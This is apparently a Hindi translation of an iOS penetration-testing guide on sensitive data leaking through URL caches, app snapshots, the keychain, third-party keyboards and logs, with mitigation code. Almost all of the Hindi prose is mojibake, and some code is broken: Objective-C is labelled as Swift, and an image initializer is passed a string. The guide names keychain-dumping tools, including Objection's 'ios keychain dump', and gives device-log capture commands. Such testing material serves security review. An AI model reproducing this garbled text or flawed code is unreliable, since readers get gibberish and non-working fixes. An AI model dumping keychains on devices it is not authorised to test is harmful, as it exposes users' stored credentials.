рдЗрд╕ **рдбреЗрдЯрд╛ рдХреИрд╢ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рдЕрдиреБрд░реЛрдз рдпрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛ рд╕рдХрддреА рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реВрдЪреА рдиреАрдЪреЗ рджрд┐рдЦрд╛рддреА рд╣реИ рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ:

1. рд▓реЙрдЧрдЖрдЙрдЯ рдХреЗ рдмрд╛рдж рдХреИрд╢ рдХреА рдЧрдИ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рд╣рдЯрд╛рдирд╛ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕реЗ Apple рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рд╡рд┐рдзрд┐ рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) рдЖрдк рдЗрд╕ рд╡рд┐рдзрд┐ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдореЗрдВ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

`URLCache.shared.removeAllCachedResponses()`

рдпрд╣ рд╡рд┐рдзрд┐ рдХреИрд╢ рдбреАрдмреА рдлрд╝рд╛рдЗрд▓ рд╕реЗ рд╕рднреА рдХреИрд╢ рдЕрдиреБрд░реЛрдз рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рд╣рдЯрд╛ рджреЗрдЧреАред
2. рдпрджрд┐ рдХреБрдХреАрдЬрд╝ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ рддреЛ URLSession рдХреА [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) рд╡рд┐рдиреНрдпрд╛рд╕ рд╕рдВрдкрддреНрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреЛ рдХреБрдХреАрдЬрд╝ рдФрд░ рдХреИрд╢ рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рджреЗрдЧрд╛ред

[Apple documentation](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`рдПрдХ рдЕрд▓реНрдкрдХрд╛рд▓рд┐рдХ рд╕рддреНрд░ рд╡рд┐рдиреНрдпрд╛рд╕ рд╡рд╕реНрддреБ рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рддреНрд░ рд╡рд┐рдиреНрдпрд╛рд╕ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рджреЗрдЦреЗрдВ) рдХреЗ рд╕рдорд╛рди рд╣реИ, рдХреЗрд╡рд▓ рдпрд╣ рд╕рддреНрд░ рд╡рд╕реНрддреБ рдЪреЗрд╣рд░реЗ, рдкрд╣реБрдВрдЪ рдкреБрд╕реНрддрдХрд╛рд▓рдп, рдпрд╛ рдХрд┐рд╕реА рднреА рд╕рддреНрд░ рд╕рдВрдмрдВрдзрд┐рдд рдбреЗрдЯрд╛ рдХреЛ рдбрд┐рд╕реНрдХ рдкрд░ рд╕реНрдЯреЛрд░ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рд╕рддреНрд░ рд╕рдВрдмрдВрдзрд┐рдд рдбреЗрдЯрд╛ рд░реИрдо рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдЕрд▓реНрдкрдХрд╛рд▓рд┐рдХ рд╕рддреНрд░ рдХреЗрд╡рд▓ рддрдм рдбрд┐рд╕реНрдХ рдкрд░ рдбреЗрдЯрд╛ рд▓рд┐рдЦрддрд╛ рд╣реИ рдЬрдм рдЖрдк рдЗрд╕реЗ рдПрдХ URL рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддреЗ рд╣реИрдВред`
3. рдХреИрд╢ рдХреЛ [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed) рдкреЙрд▓рд┐рд╕реА рдкрд░ рд╕реЗрдЯ рдХрд░рдХреЗ рдХреИрд╢ рдХреЛ рдЕрдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ рдХреИрд╢ рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рджреЗрдЧрд╛, рдЪрд╛рд╣реЗ рд╡рд╣ рдореЗрдореЛрд░реА рдореЗрдВ рд╣реЛ рдпрд╛ рдбрд┐рд╕реНрдХ рдкрд░ред

### рд╕реНрдиреИрдкрд╢реЙрдЯ

рдЬрдм рднреА рдЖрдк рд╣реЛрдо рдмрдЯрди рджрдмрд╛рддреЗ рд╣реИрдВ, iOS **рд╡рд░реНрддрдорд╛рди рд╕реНрдХреНрд░реАрди рдХрд╛ рдПрдХ рд╕реНрдиреИрдкрд╢реЙрдЯ** рд▓реЗрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рд╕реНрдореВрдж рддрд░реАрдХреЗ рд╕реЗ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛** рд╡рд░реНрддрдорд╛рди рд╕реНрдХреНрд░реАрди рдореЗрдВ рдореМрдЬреВрдж рд╣реИ, рддреЛ рдпрд╣ **рдЫрд╡рд┐ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛** (рдЬреЛ **рд░реАрдмреВрдЯ рдХреЗ рдмрд╛рдж рднреА рдмрдирд╛ рд░рд╣рддрд╛ рд╣реИ**)ред рдпреЗ рд╕реНрдиреИрдкрд╢реЙрдЯ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдбрдмрд▓ рдЯреИрдк рдХрд░рдХреЗ рд╣реЛрдо рд╕реНрдХреНрд░реАрди рдкрд░ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдмреАрдЪ рд╕реНрд╡рд┐рдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдЬрдм рддрдХ iPhone рдЬреЗрд▓рдмреНрд░реЛрдХрди рдирд╣реАрдВ рд╣реИ, **рд╣рдорд▓рд╛рд╡рд░** рдХреЛ рдЗрди рд╕реНрдХреНрд░реАрдирд╢реЙрдЯреНрд╕ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг **рдЕрдирдмреНрд▓реЙрдХ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЖрдЦрд┐рд░реА рд╕реНрдиреИрдкрд╢реЙрдЯ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдореЗрдВ `Library/Caches/Snapshots/` рдпрд╛ `Library/SplashBoard/Snapshots` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХрдВрдкреНрдпреВрдЯрд░ iOX 7.0 рд╕реЗ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

рдЗрд╕ рдмреБрд░реА рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рд░реЛрдХрдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╕реНрдиреИрдкрд╢реЙрдЯ рд▓реЗрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ `ApplicationDidEnterBackground()` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЦрд╛рд▓реА рд╕реНрдХреНрд░реАрди рдбрд╛рд▓рдирд╛ рдпрд╛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рд╣рдЯрд╛рдирд╛ рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдПрдХ рдирдореВрдирд╛ рд╕реБрдзрд╛рд░рдиреЗ рдХреА рд╡рд┐рдзрд┐ рд╣реИ рдЬреЛ рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рд╕реЗрдЯ рдХрд░реЗрдЧреАред

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
рдЙрджреНрджреЗрд╢реНрдп-рд╕реА:
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
### рдкреГрд╖реНрдарднреВрдорд┐ рдЫрд╡рд┐ рдХреЛ `overlayImage.png` рдкрд░ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ рдЬрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмреИрдХрдЧреНрд░рд╛рдЙрдВрдб рдореЗрдВ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рд▓реАрдХ рдХреЛ рд░реЛрдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ `overlayImage.png` рд╣рдореЗрд╢рд╛ рд╡рд░реНрддрдорд╛рди рджреГрд╢реНрдп рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░реЗрдЧрд╛ред

### Keychain

iOS рдХреА keychain рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдФрд░ рдЙрд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рдЙрдкрд▓рдмреНрдз рд╣реИрдВ, рдЬреЛ рдЬреЗрд▓рдмреНрд░реЛрдХрди рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, [**Objection**](https://github.com/sensepost/objection) рдиреЗ рд╕рдорд╛рди рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП `ios keychain dump` рдирд╛рдордХ рдХрдорд╛рдВрдб рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рд╣реИред

#### **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕реНрдЯреЛрд░ рдХрд░рдирд╛**

**NSURLCredential** рд╡рд░реНрдЧ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕реАрдзреЗ keychain рдореЗрдВ рд╕рд╣реЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрджрд░реНрд╢ рд╣реИ, NSUserDefaults рдпрд╛ рдЕрдиреНрдп рд▓реЗрдкрдХреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдЫреЛрдбрд╝рддреЗ рд╣реБрдПред рд▓реЙрдЧрд┐рди рдХреЗ рдмрд╛рдж рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд Swift рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
## **рдХрд╕реНрдЯрдо рдХреАрдмреЛрд░реНрдб рдФрд░ рдХреАрдмреЛрд░реНрдб рдХреИрд╢**

iOS 8.0 рдХреЗ рдмрд╛рдж, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╕реНрдЯрдо рдХреАрдмреЛрд░реНрдб рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ **рд╕реЗрдЯрд┐рдВрдЧреНрд╕ > рд╕рд╛рдорд╛рдиреНрдп > рдХреАрдмреЛрд░реНрдб > рдХреАрдмреЛрд░реНрдб** рдХреЗ рддрд╣рдд рдкреНрд░рдмрдВрдзрди рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЬрдмрдХрд┐ рдпреЗ рдХреАрдмреЛрд░реНрдб рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рд╡реЗ рдХреАрд╕реНрдЯреНрд░реЛрдХ рд▓реЙрдЧрд┐рдВрдЧ рдФрд░ рдбреЗрдЯрд╛ рдХреЛ рдмрд╛рд╣рд░реА рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рднреЗрдЬрдиреЗ рдХрд╛ рдЦрддрд░рд╛ рдЙрдард╛рддреЗ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдиреЗрдЯрд╡рд░реНрдХ рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдиреЗ рдкрд░ рдХреАрдмреЛрд░реНрдб рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реВрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдРрдкреНрд╕ рдХреЛ рдХрд╕реНрдЯрдо рдХреАрдмреЛрд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**рд╕реБрд░рдХреНрд╖рд╛ рд╕рд┐рдлрд╛рд░рд┐рд╢реЗрдВ:**

* рдЙрдиреНрдирдд рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рдерд░реНрдб-рдкрд╛рд░реНрдЯреА рдХреАрдмреЛрд░реНрдб рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* рдбрд┐рдлрд╝реЙрд▓реНрдЯ iOS рдХреАрдмреЛрд░реНрдб рдХреЗ рдСрдЯреЛрдХрд░реЗрдХреНрдЯ рдФрд░ рдСрдЯреЛ-рд╕реБрдЭрд╛рд╡ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдЧрд░реВрдХ рд░рд╣реЗрдВ, рдЬреЛ `Library/Keyboard/{locale}-dynamic-text.dat` рдпрд╛ `/private/var/mobile/Library/Keyboard/dynamic-text.dat` рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпреЗ рдХреИрд╢ рдлрд╝рд╛рдЗрд▓реЗрдВ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдПред **рд╕реЗрдЯрд┐рдВрдЧреНрд╕ > рд╕рд╛рдорд╛рдиреНрдп > рд░реАрд╕реЗрдЯ > рдХреАрдмреЛрд░реНрдб рдбрд┐рдХреНрд╢рдирд░реА рд░реАрд╕реЗрдЯ** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреИрд╢ рдбреЗрдЯрд╛ рдХреЛ рд╕рд╛рдл рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреАрдмреЛрд░реНрдб рдбрд┐рдХреНрд╢рдирд░реА рдХреЛ рд░реАрд╕реЗрдЯ рдХрд░рдирд╛ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдЕрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░рдиреЗ рд╕реЗ рдкрддрд╛ рдЪрд▓ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдХрд╕реНрдЯрдо рдХреАрдмреЛрд░реНрдб рд░рд┐рдореЛрдЯ рд░реВрдк рд╕реЗ рдХреАрд╕реНрдЯреНрд░реЛрдХ рднреЗрдЬ рд░рд╣рд╛ рд╣реИред

### **рдЯреЗрдХреНрд╕реНрдЯ рдлрд╝реАрд▓реНрдб рдХреИрд╢рд┐рдВрдЧ рдХреЛ рд░реЛрдХрдирд╛**

[UITextInputTraits protocol](https://developer.apple.com/reference/uikit/uitextinputtraits) рдСрдЯреЛрдХрд░реЗрдХреНрд╢рди рдФрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдЯреЗрдХреНрд╕реНрдЯ рдПрдВрдЯреНрд░реА рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧреБрдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреИрд╢рд┐рдВрдЧ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдСрдЯреЛрдХрд░реЗрдХреНрд╢рди рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ рдФрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдЯреЗрдХреНрд╕реНрдЯ рдПрдВрдЯреНрд░реА рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рдЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдбреЗрд╡рд▓рдкрд░реНрд╕ рдХреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдкрд╛рда рдХреНрд╖реЗрддреНрд░, рдЦрд╛рд╕рдХрд░ рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рдкрд┐рди рдЬреИрд╕реА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, `autocorrectionType` рдХреЛ `UITextAutocorrectionTypeNo` рдФрд░ `secureTextEntry` рдХреЛ `YES` рд╕реЗрдЯ рдХрд░рдХреЗ рдХреИрд╢рд┐рдВрдЧ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **рд▓реЙрдЧ**

рдбреАрдмрдЧрд┐рдВрдЧ рдХреЛрдб рдореЗрдВ рдЕрдХреНрд╕рд░ **рд▓реЙрдЧрд┐рдВрдЧ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред **рд▓реЙрдЧ рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛ рд╕рдХрддреА рд╣реИ**, рдЗрд╕рдореЗрдВ рдПрдХ рдЬреЛрдЦрд┐рдо рд╣реЛрддрд╛ рд╣реИред рдкрд╣рд▓реЗ, iOS 6 рдФрд░ рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ, рд╕рднреА рдРрдкреНрд╕ рддрдХ рд▓реЙрдЧ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рд╕реНрдерд┐рддрд┐ рдереА, рдЬрд┐рд╕рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХрд╛ рд▓реАрдХ рд╣реЛ рд╕рдХрддрд╛ рдерд╛ред **рдЕрдм, рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗрд╡рд▓ рдЕрдкрдиреЗ рд▓реЙрдЧ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреА рд╣реИрдВ**ред

рдЗрди рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж, **рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рдлрд┐рдЬрд┐рдХрд▓ рдПрдХреНрд╕реЗрд╕** рд╣реИ рдПрдХ рдЕрдирд▓реЙрдХ рдХрд┐рдП рдЧрдП рдбрд┐рд╡рд╛рдЗрд╕ рдХрд╛, рдЗрд╕реЗ рдХрдВрдкреНрдпреВрдЯрд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдХреЗ рдЗрд╕рдХрд╛ рд╢реЛрдз рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд▓реЙрдЧ рдкрдврд╝ рд╕рдХрддрд╛ рд╣реИ**ред рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рд▓реЙрдЧ рдРрдк рдХреЗ рдЕрдирдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рдХреЗ рдмрд╛рдж рднреА рдбрд┐рд╕реНрдХ рдкрд░ рдмрдиреЗ рд░рд╣рддреЗ рд╣реИрдВред

рд░рд┐рд╕реНрдХ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдЕрдЪреНрдЫрд╛ рд╣реИ рдХрд┐ рдЖрдк **рдРрдк рдХреЗ рд╕рд╛рде рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЗрдВрдЯрд░реИрдХреНрдЯ** рдХрд░реЗрдВ, рдЙрд╕рдХреЗ рд╕рднреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдУрдВ рдФрд░ рдЗрдирдкреБрдЯ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдХреЛрдИ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рд▓реЙрдЧ рдирд╣реАрдВ рд╣реЛ рд░рд╣реА рд╣реЛред

рдкреЛрдЯреЗрдВрд╢рд┐рдпрд▓ рд▓реАрдХреНрд╕ рдХреЗ рд▓рд┐рдП рдРрдк рдХреЗ рд╕реНрд░реЛрдд рдХреЛрдб рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рддреЗ рд╕рдордп, **рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд** рдФрд░ **рдХрд╕реНрдЯрдо рд▓реЙрдЧрд┐рдВрдЧ рд╕реНрдЯреЗрдЯрдореЗрдВрдЯреНрд╕** рдХреЗ рд▓рд┐рдП рдЦреЛрдЬреЗрдВ рдЬреИрд╕реЗ рдХрд┐ `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` рдЬреИрд╕реЗ рдЗрдирдмрд┐рд▓реНрдЯ-рдЗрди рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЗ рд▓рд┐рдП, рдФрд░ рдХрд╕реНрдЯрдо рдЗрдореНрдкреНрд▓реАрдореЗрдВрдЯреЗрд╢рди рдХреЗ рд▓рд┐рдП `Logging` рдпрд╛ `Logfile` рдХреЗ рдЙрд▓реНрд▓реЗрдЦ рдХреЛред

### **рд╕рд┐рд╕реНрдЯрдо рд▓реЙрдЧ рдХрд╛ рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ**

рдРрдкреНрд╕ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд▓реЙрдЧ рдХрд░рддреЗ рд╣реИрдВред рдЗрди рд▓реЙрдЧреЛрдВ рдХреЛ рдореЙрдирд┐рдЯрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЯреВрд▓ рдФрд░ рдХрдорд╛рдВрдбреНрд╕ рдЬреИрд╕реЗ:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
рдЙрдкрдпреЛрдЧреА рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **Xcode** рдХреЙрдиреНрд╕реЛрд▓ рд▓реЙрдЧ рдПрдХрддреНрд░ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:

1. Xcode рдЦреЛрд▓реЗрдВред
2. iOS рдбрд┐рд╡рд╛рдЗрд╕ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВред
3. **Window** -> **Devices and Simulators** рдкрд░ рдЬрд╛рдПрдВред
